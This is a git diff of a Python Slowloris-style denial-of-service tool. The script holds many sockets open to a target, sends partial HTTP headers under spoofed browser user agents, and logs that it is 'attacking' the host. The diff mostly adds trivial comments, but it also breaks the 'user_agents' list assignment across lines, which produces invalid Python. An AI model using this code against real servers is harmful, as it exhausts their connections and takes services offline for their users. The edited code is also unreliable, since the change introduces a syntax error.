@@ -54,7 +54,9 @@ if args.https:
     import ssl
 
 list_of_sockets = []
-user_agents = [
+
+user_agents =
+ [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
@@ -82,7 +84,7 @@ user_agents = [
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 ]
 
-def init_socket(ip):
+def init_socket(ip):      #init_socket function is defined
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
     if args.https:
@@ -98,7 +100,7 @@ def init_socket(ip):
     s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
     return s
 
-def main():
+def main():    #main function is defined
     ip = args.host
     socket_count = args.sockets
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
@@ -125,7 +127,7 @@ def main():
             for _ in range(socket_count - len(list_of_sockets)):
                 logging.debug("Recreating socket...")
                 try:
-                    s = init_socket(ip)
+                    s = init_socket(ip)  #init function is called
                     if s:
                         list_of_sockets.append(s)
                 except socket.error as e:
@@ -139,4 +141,4 @@ def main():
             break
 
 if __name__ == "__main__":
-    main()
+    main()   # main function is being called
